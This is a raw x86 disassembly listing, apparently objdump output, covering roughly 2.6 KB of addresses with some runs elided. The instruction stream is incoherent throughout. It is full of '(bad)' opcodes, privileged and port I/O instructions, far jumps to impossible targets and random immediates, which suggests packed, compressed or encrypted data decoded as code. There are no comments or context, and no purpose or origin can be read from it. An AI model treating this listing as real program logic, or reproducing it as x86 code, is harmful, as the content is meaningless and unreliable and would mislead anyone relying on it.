  4238ab:	xchg   DWORD PTR [ebp-0x31],edx
  4238ae:	jge    0x4238bc
  4238b0:	xchg   al,dh
  4238b2:	ja     0xc037e3fd
  4238b8:	xchg   esi,eax
  4238b9:	pushfw 
  4238bb:	bound  ecx,QWORD PTR [esi-0x298bff42]
  4238c1:	xor    DWORD PTR [ecx+0x8],ecx
  4238c4:	xchg   BYTE PTR [ebp-0x6602407b],bl
  4238ca:	mov    eax,0x7bcad88a
  4238cf:	inc    edx
  4238d0:	pop    ecx
  4238d1:	dec    edi
  4238d2:	int3   
  4238d3:	int3   
  4238d4:	or     eax,0x195a7d97
  4238d9:	sbb    eax,esp
  4238db:	or     al,0x89
  4238dd:	or     eax,DWORD PTR [eax+eax*1]
  4238e0:	or     eax,0xbe8b0132
  4238e5:	sar    BYTE PTR [ebp+0x5],cl
	...
  423904:	add    BYTE PTR [eax],al
  423906:	push   cs
  423907:	fidivr DWORD PTR [edx+0x7]
  42390a:	xchg   esi,eax
  42390b:	mov    es,WORD PTR [edi+eax*4]
  42390e:	(bad)  
  423911:	jle    0x4238d4
  423913:	imul   DWORD PTR [edi+0x3c]
  423916:	adc    eax,0x8bffa579
  42391b:	aaa    
  42391c:	fstp   TBYTE PTR [esi+0x52]
  42391f:	clc    
  423920:	imul   edi,DWORD PTR [ebp-0x7f67ed82],0x59
  423927:	adc    BYTE PTR [eax-0x68f05d7a],bl
  42392d:	mov    dl,0xff
  42392f:	cmp    edi,ebp
  423931:	inc    ebx
  423932:	or     eax,0x95ffa281
  423937:	inc    edx
  423938:	rol    DWORD PTR [ebx+ecx*1],cl
  42393b:	jns    0x423958
  42393d:	cld    
  42393e:	test   esp,eax
  423940:	into   
  423941:	das    
  423942:	mov    dh,0xac
  423944:	mov    ebp,0xb582a27e
  423949:	cmp    BYTE PTR [ebp+0x78],bh
  42394c:	sub    DWORD PTR [eax],ebx
  42394e:	(bad)  
  42394f:	jmp    esi
  423951:	arpl   WORD PTR [edx-0x3578e9cb],dx
  423957:	iret   
  423958:	ss or  ebp,0xf58136ef
  42395f:	fistp  QWORD PTR [ecx+0x7c1e6ac3]
  423965:	add    ecx,DWORD PTR ds:0x37a684
	...
  423987:	add    dl,al
  423989:	sbb    edi,esp
  42398b:	sbb    eax,0x914f5101
  423990:	mov    edx,0xc786e6ff
  423995:	movntq QWORD PTR [esi-0x3b],mm7
  423999:	adc    edx,ebx
  42399b:	dec    eax
  42399c:	push   eax
  42399d:	cmp    BYTE PTR [edx],0xb1
  4239a0:	xor    DWORD PTR [edx+eiz*8+0xd03],ebp
  4239a7:	ins    BYTE PTR es:[edi],dx
  4239a8:	pop    edi
  4239a9:	xor    BYTE PTR ds:0xf0773762,cl
  4239af:	je     0x423936
  4239b1:	mov    al,0xfd
  4239b3:	push   ds
  4239b4:	mov    edi,0xbfb692a3
  4239b9:	lods   al,BYTE PTR ds:[esi]
  4239ba:	cld    
  4239bb:	xchg   esp,eax
  4239bc:	push   ds
  4239bd:	and    DWORD PTR [edx-0x3534203],0xf37e8de9
  4239c7:	neg    DWORD PTR [esp+ebp*4-0x52c04419]
  4239ce:	cld    
  4239cf:	ins    BYTE PTR es:[edi],dx
  4239d0:	pushf  
  4239d1:	das    
  4239d2:	or     eax,0xf078e472
  4239d7:	mov    ch,BYTE PTR fs:[edi-0x5c833103]
  4239de:	push   0x26
  4239e0:	jl     0x42398e
  4239e2:	mov    BYTE PTR [eax*1-0x2b9de87d],ah
  4239e9:	cwde   
  4239ea:	pop    es
  4239eb:	sbb    al,BYTE PTR [eax]
	...
  423a09:	add    BYTE PTR [ecx+0x66],bh
  423a0c:	int3   
  423a0d:	jmp    0x3f022b20
  423a12:	fisttp WORD PTR [eax-0x39]
  423a15:	stos   DWORD PTR es:[edi],eax
  423a16:	sbb    DWORD PTR [eax],eax
  423a18:	push   esi
  423a19:	add    eax,DWORD PTR ds:0x9b68b98
  423a1f:	add    BYTE PTR [ebx-0x7efada57],al
  423a25:	leave  
  423a26:	push   cs
  423a27:	jns    0x423a18
  423a29:	adc    BYTE PTR [ebx],0xf1
  423a2c:	cmc    
  423a2d:	ins    BYTE PTR es:[edi],dx
  423a2e:	xchg   edi,eax
  423a2f:	das    
  423a30:	rol    DWORD PTR ss:[edx+0x19],cl
  423a34:	or     BYTE PTR [esi+0x3a],dl
  423a37:	rcl    ebp,cl
  423a39:	stos   BYTE PTR es:[edi],al
  423a3a:	push   cs
  423a3b:	lods   eax,DWORD PTR ds:[esi]
  423a3c:	adc    al,BYTE PTR [eax]
  423a3e:	add    BYTE PTR [edi],cl
  423a40:	inc    eax
  423a41:	add    BYTE PTR [ebp+0x60c080f5],bl
  423a47:	adc    eax,DWORD PTR [edi-0x3c53efb4]
  423a4d:	inc    eax
  423a4e:	adc    BYTE PTR [edi+0x2bf4fffc],ch
  423a54:	add    ecx,DWORD PTR [ecx-0x39790554]
  423a5a:	paddd  mm1,QWORD PTR [edi-0x18]
  423a5e:	lahf   
  423a5f:	mov    edi,0x8682fffc
  423a64:	popa   
  423a65:	iret   
  423a66:	hlt    
  423a67:	(bad)  
  423a68:	ror    BYTE PTR cs:[edx+0xc4],0x0
	...
  423a8c:	adc    DWORD PTR ds:0xf6d881e9,ebp
  423a92:	cld    
  423a93:	push   DWORD PTR [eax+ecx*2+0x2d03f187]
  423a9a:	cmc    
  423a9b:	test   DWORD PTR [edx-0x1],esi
  423a9e:	or     esi,0xffffffb4
  423aa1:	(bad)  
  423aa2:	dec    DWORD PTR [ebx+esi*8+0x6bd039d3]
  423aa9:	(bad)  
  423aaa:	cld    
  423aab:	push   cs
  423aac:	and    edi,DWORD PTR [edi+0x2b74fffc]
  423ab2:	inc    edx
  423ab3:	or     al,0xf7
  423ab5:	pop    esi
  423ab6:	std    
  423ab7:	mov    BYTE PTR [ecx],dh
  423ab9:	add    BYTE PTR [ecx+0x11],dh
  423abc:	adc    eax,DWORD PTR [esi-0x18]
  423abf:	xchg   esi,eax
  423ac0:	mov    ebx,0xe48afffe
  423ac5:	xor    edx,0xfd22f00f
  423acb:	jmp    DWORD PTR [ebx+eax*4+0x79]
  423acf:	or     BYTE PTR [edx+esi*8],dh
  423ad2:	inc    eax
  423ad3:	dec    DWORD PTR ds:0x7080f8cc
  423ad9:	inc    eax
  423ada:	scas   eax,DWORD PTR es:[edi]
  423adb:	cld    
  423adc:	xor    bl,BYTE PTR [eax-0x15ca7d83]
  423ae2:	scas   eax,DWORD PTR es:[edi]
  423ae3:	cld    
  423ae4:	xor    eax,0x1afd4e8a
  423ae9:	and    esi,DWORD PTR [eax-0x27d1fd8d]
  423aef:	mov    BYTE PTR [eax],al
	...
  423b0d:	add    bl,bl
  423b0f:	sbb    al,0x86
  423b11:	out    0x3,eax
  423b13:	adc    esi,DWORD PTR [eax-0x50a57819]
  423b19:	cld    
  423b1a:	retf   0x991c
  423b1d:	std    
  423b1e:	jmp    0x8597:0xd0005aa
  423b25:	cld    
  423b26:	popa   
  423b27:	retf   0xd47b
  423b2a:	xchg   BYTE PTR [ecx+0x7e],dh
  423b2d:	xor    BYTE PTR [ebp-0x4a035337],0x44
  423b34:	dec    ebp
  423b35:	std    
  423b36:	mov    edx,0xf614461e
  423b3b:	pop    ecx
  423b3c:	ss inc esi
  423b3e:	mov    ss,WORD PTR [edi-0x2d]
  423b41:	dec    edi
  423b42:	nop
  423b43:	fpatan 
  423b45:	dec    edi
  423b46:	mov    ah,bl
  423b48:	mov    bl,0x30
  423b4a:	int    0x8f
  423b4c:	mov    al,0xf8
  423b4e:	or     eax,0xf9bf8497
  423b53:	(bad)  
  423b54:	push   ss
  423b55:	adc    BYTE PTR [eax-0x79b01c1f],cl
  423b5b:	pop    edx
  423b5c:	push   ebx
  423b5d:	std    
  423b5e:	add    bh,bl
  423b60:	adc    eax,0xc8160d40
  423b65:	or     edx,DWORD PTR [eax-0x18e5c9a9]
  423b6b:	(bad)  
  423b6c:	jmp    0x3:0xe6b9c39b
	...
  423b8f:	add    BYTE PTR [esi-0x73f72540],cl
  423b95:	loopne 0x423b7d
  423b97:	call   0x346a:0x8926ed0c
  423b9e:	jecxz  0x423c1c
  423ba0:	repnz xchg esp,eax
  423ba2:	in     al,0x82
  423ba4:	xchg   edi,eax
  423ba5:	sti    
  423ba6:	out    0x38,al
  423ba8:	or     edx,DWORD PTR [edx+0xf]
  423bab:	sub    bl,bl
  423bad:	jmp    esi
  423baf:	bnd ret 0xb548
  423bb3:	mov    esp,0x58e6f7cc
  423bb8:	test   BYTE PTR [ebx+0x7b435297],bl
  423bbe:	stos   DWORD PTR es:[edi],eax
  423bbf:	scas   eax,DWORD PTR es:[edi]
  423bc0:	push   ebx
  423bc1:	push   ss
  423bc2:	call   0x73eb48e0
  423bc7:	sti    
  423bc8:	mov    eax,DWORD PTR [edx-0x1d]
  423bcb:	push   ebx
  423bcc:	enter  0x1b12,0x14
  423bd0:	dec    ebp
  423bd1:	add    BYTE PTR [ebx+eax*8+0x3f],ch
  423bd5:	pop    es
  423bd6:	aas    
  423bd7:	cld    
  423bd8:	or     al,0x0
  423bda:	out    0x56,eax
  423bdc:	xchg   esi,eax
  423bdd:	inc    edx
  423bde:	out    dx,eax
  423bdf:	push   ebx
  423be0:	mov    al,ds:0x1f80e332
  423be5:	lods   al,BYTE PTR ds:[esi]
  423be6:	mov    esi,0xe6a892cb
  423beb:	jp     0x423c4f
  423bed:	xchg   esp,eax
  423bee:	jmp    0x69ea9175
  423bf3:	stos   BYTE PTR es:[edi],al
	...
  423c10:	add    BYTE PTR [eax],al
  423c12:	jns    0x423c47
  423c14:	pop    ss
  423c15:	mov    dh,0x4d
  423c17:	(bad)  
  423c18:	sti    
  423c19:	sbb    cl,BYTE PTR [edx+ebp*1+0x1d904ef]
  423c20:	add    BYTE PTR [edx+0x1d],ch
  423c23:	clc    
  423c24:	add    esp,esi
  423c26:	ret    
  423c27:	jl     0x423c01
  423c29:	fcom   QWORD PTR [ebx]
  423c2b:	out    dx,eax
  423c2c:	mov    edi,0xe903c1c7
  423c31:	mov    ecx,0xaa8a9761
  423c36:	arpl   WORD PTR [edx],sp
  423c38:	add    DWORD PTR ds:0xea72ffd2,0xa90f96e7
  423c42:	sbb    eax,0xee8fefc
  423c47:	das    
  423c48:	cmp    ebx,edx
  423c4a:	leave  
  423c4b:	sbb    eax,0x794bed87
  423c50:	xlat   BYTE PTR ds:[ebx]
  423c51:	push   0xffffffa6
  423c53:	add    DWORD PTR [esi-0x43],esi
  423c56:	(bad)
  423c5a:	and    eax,0x6f1154de
  423c5f:	jb     0x423c60
  423c61:	call   0xf7c4d3bd
  423c66:	sbb    esi,edi
  423c68:	addr16 in eax,dx
  423c6a:	sldt   WORD PTR [eax]
  423c6d:	ss pop ebx
  423c6f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423c70:	adc    cl,BYTE PTR [ecx]
  423c72:	push   ds
  423c73:	inc    eax
  423c74:	add    BYTE PTR [eax+eax*1+0x0],ah
	...
  423c94:	leave  
  423c95:	xor    al,BYTE PTR [ecx]
  423c97:	push   0x64
  423c99:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423c9a:	push   ebp
  423c9b:	ror    ebx,1
  423c9d:	mov    edx,0xc015e8ff
  423ca2:	call   0xfd01ca91
  423ca7:	inc    edi
  423ca8:	aam    0xbe
  423caa:	shl    ecx,0xe
  423cad:	push   ebx
  423cae:	mov    DWORD PTR [ebp+0x48136de],eax
  423cb4:	mov    ebp,0x21008ba7
  423cb9:	push   esp
  423cba:	dec    ebp
  423cbb:	push   0x75
  423cbd:	or     DWORD PTR [eax],eax
  423cbf:	call   FWORD PTR [ecx-0x55]
  423cc2:	test   DWORD PTR [ebp-0x24],eax
  423cc5:	dec    ebx
  423cc6:	sti    
  423cc7:	adc    eax,0x400bf0
  423ccc:	test   eax,0x7a1971bb
  423cd1:	or     DWORD PTR [ecx*4-0x72b3a897],eax
  423cd8:	jns    0x423c85
  423cda:	dec    esp
  423cdb:	call   FWORD PTR [ecx-0x59]
  423cde:	mov    DWORD PTR [ebp-0x24],esi
  423ce1:	adc    DWORD PTR [edi],0x0
  423ce4:	and    al,0x3
  423ce6:	pop    esi
  423ce7:	jmp    0x423ce0
  423ce9:	jg     0x423caf
  423ceb:	push   DWORD PTR [edi+0x54]
  423cee:	add    BYTE PTR [ebp-0x17],dh
  423cf1:	cdq    
  423cf2:	inc    ecx
  423cf3:	or     BYTE PTR [eax+0x657efe],bl
	...
  423d15:	add    BYTE PTR [eax],dl
  423d17:	cld    
  423d18:	xchg   BYTE PTR [ebp-0x20],al
  423d1b:	imul   edi,DWORD PTR [esi-0x78b21bf8],0x42257bec
  423d25:	adc    al,0x4
  423d27:	push   ebp
  423d28:	jno    0x423d3a
  423d2a:	aaa    
  423d2b:	fs sti 
  423d2d:	call   FWORD PTR [ecx+0x0]
  423d30:	push   0x0
  423d32:	ret    
  423d33:	in     eax,dx
  423d34:	pop    es
  423d35:	jmp    FWORD PTR [edx-0x3bc7eead]
  423d3b:	inc    edx
  423d3c:	add    bh,bh
  423d3e:	call   0x13d6:0xe80fbc7d
  423d45:	dec    DWORD PTR [ecx+0x74400ff6]
  423d4b:	daa    
  423d4c:	les    ebx,FWORD PTR [edi+0xd]
  423d4f:	in     al,dx
  423d50:	ror    DWORD PTR [edi],0xd
  423d53:	in     al,dx
  423d54:	jbe    0x423d41
  423d56:	mov    esp,0xbed8ef09
  423d5b:	adc    edi,DWORD PTR [esi]
  423d5d:	cld    
  423d5e:	mov    esp,0xbe021a09
  423d63:	or     DWORD PTR [edi-0x3],ecx
  423d66:	shl    BYTE PTR [eax-0x67bd0198],0x80
  423d6d:	dec    edi
  423d6e:	test   BYTE PTR [ebx-0x54],dl
  423d71:	cld    
  423d72:	sbb    BYTE PTR [ecx+0x140d4010],dh
  423d78:	shl    DWORD PTR [edx+0x0],0x0
	...
  423d98:	call   0x1a5a7382
  423d9d:	arpl   WORD PTR [edi*8-0x2b03768],dx
  423da4:	sub    BYTE PTR [ebx+0x70172ab],0x16
  423dab:	inc    eax
  423dac:	sbb    eax,0xcd830057
  423db1:	mov    esi,?
  423db3:	mov    al,0xc
  423db5:	(bad)  
  423db6:	xor    eax,0xccce2fc
  423dbb:	adc    BYTE PTR [ebp-0x69],cl
  423dbe:	jbe    0x423d80
  423dc0:	ss loopne 0x423d81
  423dc3:	adc    ecx,DWORD PTR ds:0x8eeb7ce4
  423dc9:	mov    bl,0xf7
  423dcb:	or     BYTE PTR [eax-0x31],0xa8
  423dcf:	push   eax
  423dd0:	pop    ebx
  423dd1:	and    ch,bh
  423dd3:	aaa    
  423dd4:	std    
  423dd5:	(bad)  
  423dd6:	add    ecx,DWORD PTR [ebx+0x31536348]
  423ddc:	mov    dh,0xa
  423dde:	test   eax,0x47200172
  423de3:	cld    
  423de4:	fdivp  st(7),st
  423de6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423de7:	xor    DWORD PTR ds:0x60aad5a5,edx
  423ded:	jnp    0x423d95
  423def:	xor    esp,eax
  423df1:	js     0x423e16
  423df3:	test   al,0x25
  423df5:	sar    ebx,0x0
  423df8:	mov    al,BYTE PTR [ebx+0x7f]
  423dfb:	lahf   
	...
  423e18:	add    BYTE PTR [eax],al
  423e1a:	sbb    DWORD PTR [ecx-0x3eebff5a],eax
  423e20:	bnd jmp 0x423e55
  423e23:	pop    ss
  423e24:	xor    eax,DWORD PTR [ecx*1-0xa505c89]
  423e2b:	rcr    dl,0xd7
  423e2e:	xchg   DWORD PTR [ebx],esi
  423e30:	dec    ebx
  423e31:	push   ebp
  423e32:	mov    ebp,0xbdf7bba4
  423e37:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423e38:	mov    bl,0xfb
  423e3a:	sbb    ebp,ebp
  423e3c:	xor    eax,0xb3c08fd2
  423e41:	adc    edx,DWORD PTR [edx+edi*1-0x53a88109]
  423e48:	outs   dx,DWORD PTR ds:[esi]
  423e49:	cld    
  423e4a:	test   DWORD PTR [edx],edi
  423e4c:	adc    edi,DWORD PTR [ebp+0x4f]
  423e4f:	test   al,0x1
  423e51:	cld    
  423e52:	jmp    0x6bde3981
  423e57:	mov    ah,0xe6
  423e59:	add    ebx,eax
  423e5b:	in     al,dx
  423e5c:	cmc    
  423e5d:	adc    cl,dh
  423e5f:	xstore-rng (bad)
  423e60:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423e61:	add    edx,DWORD PTR [edx+edi*1-0x489bb621]
  423e68:	test   al,0xf7
  423e6a:	mov    edx,0x42c41a51
  423e6f:	push   eax
  423e70:	aaa    
  423e71:	push   esp
  423e72:	test   al,0x2b
  423e74:	or     ecx,DWORD PTR [eax+eiz*4]
  423e77:	in     eax,dx
  423e78:	mov    ebp,0xfd510
  423e7d:	sub    DWORD PTR [eax],eax
	...
  423e9b:	add    BYTE PTR [ecx],cl
  423e9d:	mov    ds:0xab566235,eax
  423ea2:	fadd   DWORD PTR [ebx]
  423ea4:	push   edx
  423ea5:	mov    ds:0x41d9ec0,al
  423eaa:	adc    BYTE PTR [ecx],ch
  423eac:	or     DWORD PTR [edx-0x40],edi
  423eaf:	xor    dl,BYTE PTR [ebx+0x0]
  423eb2:	add    BYTE PTR [edx+eiz*8],bl
  423eb5:	cwde   
  423eb6:	jle    0x423e45
  423eb8:	mov    dh,0xa4
  423eba:	cld    
  423ebb:	jmp    0x6e4e684b
  423ec0:	inc    edi
  423ec1:	sbb    BYTE PTR [edx-0x9fff117],0xa4
  423ec8:	or     al,BYTE PTR [edx]
  423eca:	mov    ebp,DWORD PTR [edx+ebp*2-0x299b74cc]
  423ed1:	mov    ds:0xa2be46fc,al
  423ed6:	jb     0x423ec5
  423ed8:	dec    edi
  423ed9:	inc    ecx
  423eda:	cld    
  423edb:	imul   ecx,DWORD PTR [esi],0x20b50000
  423ee1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423ee2:	adc    dl,BYTE PTR ds:0x6400401d
  423ee8:	into   
  423ee9:	das    
  423eea:	adc    BYTE PTR [edx-0x4a],ch
  423eed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423eee:	out    0x3b,al
  423ef0:	push   cs
  423ef1:	add    BYTE PTR [eax],al
  423ef3:	push   es
  423ef4:	std    
  423ef5:	fwait
  423ef6:	adc    ch,BYTE PTR [ecx-0x701466f2]
  423efc:	mov    esp,DWORD PTR [esi+0x57]
  423eff:	out    dx,al
	...
  423f1c:	add    BYTE PTR [eax],al
  423f1e:	je     0x423ec4
  423f20:	add    DWORD PTR [ebx+eiz*8+0x19],ebx
  423f24:	add    al,0x6c
  423f26:	cmp    al,BYTE PTR [edi-0x3]
  423f29:	(bad)  
  423f2a:	xor    ecx,DWORD PTR fs:[ebx-0x39cc8edc]
  423f31:	add    cl,dh
  423f33:	test   al,0xfd
  423f35:	out    0xa7,eax
  423f37:	imul   edi,esp,0xffffffff
  423f3a:	dec    esi
  423f3b:	cli    
  423f3c:	mov    BYTE PTR [ebp-0x4a6e2],al
  423f42:	inc    esp
  423f43:	sub    eax,DWORD PTR [edx-0x1c]
  423f46:	xor    al,0x84
  423f48:	in     eax,dx
  423f49:	retf   
  423f4a:	fs jmp esi
  423f4d:	push   esi
  423f4e:	adc    bh,BYTE PTR [ebp-0x47]
  423f51:	pop    eax
  423f52:	mov    ebx,DWORD PTR [ecx-0x5]
  423f55:	pop    ss
  423f56:	popa   
  423f57:	sub    eax,0x22e91067
  423f5c:	pop    ebp
  423f5d:	(bad)  
  423f5e:	mov    ebx,0x718d4c58
  423f63:	pop    edi
  423f64:	dec    esp
  423f65:	(bad)  
  423f66:	jno    0x423f10
  423f68:	add    al,ch
  423f6a:	jmp    0x423fd0
  423f6c:	cld    
  423f6d:	dec    DWORD PTR [esi-0x3]
  423f70:	mov    BYTE PTR [ebp-0x4a792],al
  423f76:	je     0x423fa2
  423f78:	inc    edx
  423f79:	lock je 0x423f03
  423f7c:	mov    ecx,0xe6fef4cb
  423f81:	adc    eax,0x0
	...
  423f9e:	add    BYTE PTR [eax],al
  423fa0:	sahf   
  423fa1:	cli    
  423fa2:	mov    BYTE PTR [ebp+0x4],al
  423fa5:	dec    esp
  423fa6:	call   0x3e6814
  423fab:	cmc    
  423fac:	mov    cl,0xf2
  423fae:	cld    
  423faf:	jae    0x423f8a
  423fb1:	rol    BYTE PTR [ecx+0xf],0xf0
  423fb5:	mov    edi,0xfeb6fc41
  423fba:	(bad)  
  423fbb:	dec    DWORD PTR [edi]
  423fbd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423fbe:	ret    0xbb45
  423fc1:	std    
  423fc2:	ret    0xd845
  423fc5:	add    BYTE PTR [eax],al
  423fc7:	add    BYTE PTR ds:0xfd427a99,cl
  423fcd:	and    BYTE PTR [esi],bh
  423fcf:	or     esi,DWORD PTR [edi]
  423fd1:	xchg   ebp,eax
  423fd2:	jne    0x424016
  423fd4:	or     DWORD PTR [ecx],ecx
  423fd6:	jne    0x42401a
  423fd8:	mov    cl,0x8
  423fda:	ret    0x1942
  423fdd:	pushf  
  423fde:	mov    esi,0x98991342
  423fe3:	jb     0x42402b
  423fe5:	cwde   
  423fe6:	add    BYTE PTR [ecx-0x407c7338],cl
  423fec:	adc    ecx,ebp
  423fee:	je     0x424032
  423ff0:	inc    ecx
  423ff1:	or     BYTE PTR [edi+0x76910572],ah
  423ff7:	pop    edx
  423ff8:	push   edx
  423ff9:	sub    esp,esi
  423ffb:	(bad)  
  423ffc:	xchg   ecx,eax
  423ffd:	pop    eax
  423ffe:	not    DWORD PTR [edx-0x393dd2b4]
	...
  424020:	add    BYTE PTR [eax],al
  424022:	dec    edi
  424023:	test   al,0x0
  424025:	push   ebx
  424026:	xchg   BYTE PTR [edx+eax*4],bh
  424029:	jmp    0x424048
  42402b:	pushf  
  42402c:	add    BYTE PTR [eax],al
  42402e:	mov    esi,0x5727b82
  424033:	mov    cl,BYTE PTR [esi-0x18]
  424036:	add    al,0x65
  424038:	add    BYTE PTR [eax],al
  42403a:	ds loopne 0x424021
  42403d:	add    DWORD PTR [edx],edx
  42403f:	and    eax,edx
  424041:	xor    dh,dl
  424043:	data16 sbb bh,bh
  424046:	adc    DWORD PTR [ebx+ebp*4+0x4f],0x4a79f196
  42404e:	in     eax,dx
  42404f:	jge    0x7de51ab0
  424055:	mov    edi,0x2431302
  42405a:	or     eax,0xc65ae897
  42405f:	add    dh,dh
  424061:	jg     0x424066
  424063:	(bad)  
  424064:	out    0x3,al
  424066:	add    BYTE PTR [edx+0x2b],ch
  424069:	stos   DWORD PTR es:[edi],eax
  42406a:	cmp    eax,0x7e815c50
  42406f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424070:	lds    esp,FWORD PTR [edi+0x4837984a]
  424076:	nop
  424077:	mov    eax,ds:0x7c19c46a
  42407c:	int    0x1
  42407e:	or     eax,0xcf6df600
  424083:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424084:	xchg   ecx,eax
  424085:	cli    
	...
  4240a2:	add    BYTE PTR [eax],al
  4240a4:	retf   0x72e7
  4240a7:	add    DWORD PTR [ecx-0x2158725c],eax
  4240ad:	loop   0x424070
  4240af:	ret    0xaddf
  4240b2:	mov    ecx,0xd1c859c3
  4240b7:	ret    
  4240b8:	out    dx,eax
  4240b9:	jmp    edi
  4240bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4240bc:	inc    ecx
  4240bd:	popa   
  4240be:	jmp    0x424066
  4240c0:	cmp    ah,BYTE PTR [ecx+0x6901bee9]
  4240c6:	es jge 0x424098
  4240c9:	fwait
  4240ca:	rol    BYTE PTR [ecx],0x96
  4240cd:	cmp    ecx,DWORD PTR [ebx+0x54]
  4240d0:	ret    
  4240d1:	xchg   edi,eax
  4240d2:	dec    ebp
  4240d3:	dec    eax
  4240d4:	adc    BYTE PTR [ecx+0x7c19c46a],ah
  4240da:	or     eax,0x8d000d05
  4240df:	in     al,dx
  4240e0:	ja     0x42407e
  4240e2:	xchg   ebx,eax
  4240e3:	adc    edi,DWORD PTR [ebp-0x14300002]
  4240e9:	mov    al,ds:0xfa8e78e6
  4240ee:	pop    edx
  4240ef:	test   al,0xd9
  4240f1:	mov    al,ds:0x163dc411
  4240f6:	add    ch,ch
  4240f8:	inc    ebp
  4240f9:	les    ebx,FWORD PTR ds:[ecx+0x4487a347]
  424100:	push   0xffffff98
  424102:	add    DWORD PTR ds:0xa983a36a,edi
	...
  424124:	add    BYTE PTR [eax],al
  424126:	mov    ds:0xee8af7c,eax
  42412b:	add    BYTE PTR [eax+0xcfdcd44],al
  424131:	xor    BYTE PTR fs:[edx+0x3db8e9fc],ah
  424138:	loopne 0x424122
  42413a:	xor    dl,BYTE PTR [eax]
  42413c:	lds    ebp,FWORD PTR [ecx+ebp*8]
  42413f:	or     eax,DWORD PTR [eax]
  424141:	jmp    0x5584fc54
  424146:	or     al,0x0
  424148:	add    cl,ch
  42414a:	xchg   edx,esi
  42414c:	les    ebp,FWORD PTR [ecx+ebp*8]
  42414f:	(bad)  
  424150:	(bad)  
  424151:	call   0x3584fc64
  424156:	sbb    eax,DWORD PTR [eax]
  424158:	add    cl,ch
  42415a:	cmp    ebp,DWORD PTR [edx+0x42]
  42415d:	div    BYTE PTR cs:[esi+0x32]
  424161:	add    eax,0x60004018
  424166:	aad    0xc7
  424168:	or     al,0x65
  42416a:	cld    
  42416b:	mov    al,ds:0x37d6e9fc
  424170:	je     0x424121
  424172:	(bad)  
  424173:	repnz or dl,0x11
  424177:	add    BYTE PTR [eax],al
  424179:	bound  esi,QWORD PTR ds:0x1e935108
  42417f:	mov    eax,DWORD PTR [edx-0x3635403]
  424185:	mov    ecx,0xe587886
	...
  4241a6:	add    BYTE PTR [eax],al
  4241a8:	stos   DWORD PTR es:[edi],eax
  4241a9:	cmp    DWORD PTR [edi+0x461fe300],0x1
  4241b0:	in     al,0x3
  4241b2:	push   0x20
  4241b4:	mov    ds,WORD PTR [ebx-0x32e3ca05]
  4241ba:	aas    
  4241bb:	add    BYTE PTR [ebx-0x33ba7a32],dh
  4241c1:	test   eax,0x68380fbf
  4241c6:	cld    
  4241c7:	push   DWORD PTR [ecx+edi*8+0x1b4a5912]
  4241ce:	add    eax,0x8a16b46a
  4241d3:	sbb    al,0xc3
  4241d5:	gs sti 
  4241d7:	xor    DWORD PTR [esp+ebx*4+0x364fae5],0x0
  4241df:	mov    edx,DWORD PTR [ecx]
  4241e1:	pushf  
  4241e2:	dec    edi
  4241e3:	push   0x75
  4241e5:	push   ss
  4241e6:	inc    edx
  4241e7:	mul    BYTE PTR [esp+edi*2]
  4241ea:	push   ebx
  4241eb:	pop    ebx
  4241ec:	xchg   ebx,eax
  4241ed:	gs add al,0x63
  4241f1:	pop    ds
  4241f2:	add    al,BYTE PTR [ecx]
  4241f4:	xor    al,0x3
  4241f6:	cmp    BYTE PTR [ebp-0x46],bl
  4241f9:	xchg   esp,eax
  4241fa:	cmp    ah,0x24
  4241fd:	add    eax,DWORD PTR [eax]
  4241ff:	setp   bh
  424202:	cmc    
  424203:	push   ebx
  424204:	fs push ss
  424206:	adc    BYTE PTR [edi+edi*4],0x64
  42420a:	sti    
  42420b:	push   eax
	...
  424228:	add    BYTE PTR [eax],al
  42422a:	mov    esp,0xd3ff578f
  42422f:	jg     0x4241ed
  424231:	vmread DWORD PTR [edx-0x4],esp
  424235:	push   esp
  424237:	xchg   ebx,eax
  424238:	mov    dl,0x45
  42423a:	sbb    bl,BYTE PTR [ecx+ebx*4]
  42423d:	add    eax,0xfffb67f8
  424242:	or     eax,0x3dc83d24
  424247:	pop    edx
  424248:	dec    edi
  424249:	mov    edx,DWORD PTR [eax-0x2d035844]
  42424f:	js     0x4242ca
  424251:	pop    edx
  424252:	aad    0x95
  424254:	or     eax,0x6918d4
  424259:	or     ebp,0x3c
  42425c:	stc    
  42425d:	lds    ecx,FWORD PTR [eax-0x4a]
  424260:	cld    
  424261:	out    0x84,al
  424263:	test   al,0x0
  424265:	add    bh,bl
  424267:	pop    edx
  424268:	ja     0x4242ac
  42426a:	lds    eax,FWORD PTR [ecx]
  42426c:	mov    edi,0x6aadfe73
  424271:	leave  
  424272:	xchg   esi,eax
  424273:	in     al,0x74
  424275:	mov    bh,0x44
  424277:	loope  0x424278
  424279:	jae    0x424293
  42427b:	adc    al,BYTE PTR [ecx+0x1c]
  42427e:	ss push 0x2d
  424281:	hlt    
  424282:	imul   ebp,DWORD PTR [edx-0x80],0xfffffff9
  424286:	psubq  mm0,mm2
  424289:	(bad)
  42428c:	std    
  42428d:	cld    
	...
  4242aa:	add    BYTE PTR [eax],al
  4242ac:	fcom   DWORD PTR [eax-0x5d]
  4242af:	adc    bh,cl
  4242b1:	mov    esi,0x5360040
  4242b6:	mov    ds:0x31261d6f,eax
  4242bb:	sbb    BYTE PTR ds:0x2affba23,ah
  4242c1:	pop    ds
  4242c2:	ds fsub st,st(6)
  4242c5:	jmp    0x6b9548f7
  4242ca:	stos   DWORD PTR es:[edi],eax
  4242cb:	(bad)  
  4242cc:	daa    
  4242cd:	sti    
  4242ce:	sbb    al,BYTE PTR [ecx-0x2ad241bb]
  4242d4:	xchg   esp,eax
  4242d5:	outs   dx,DWORD PTR ds:[esi]
  4242d6:	or     BYTE PTR [edi-0x6714ffab],al
  4242dc:	ror    DWORD PTR [ecx+0x2a3dfb9b],0xeb
  4242e3:	jbe    0x424334
  4242e5:	push   esp
  4242e6:	mov    dh,0x9b
  4242e8:	cmp    DWORD PTR [edx],0xc08ea406
  4242ee:	jb     0x42432a
  4242f0:	aaa    
  4242f1:	hlt    
  4242f2:	cmp    bl,0xc1
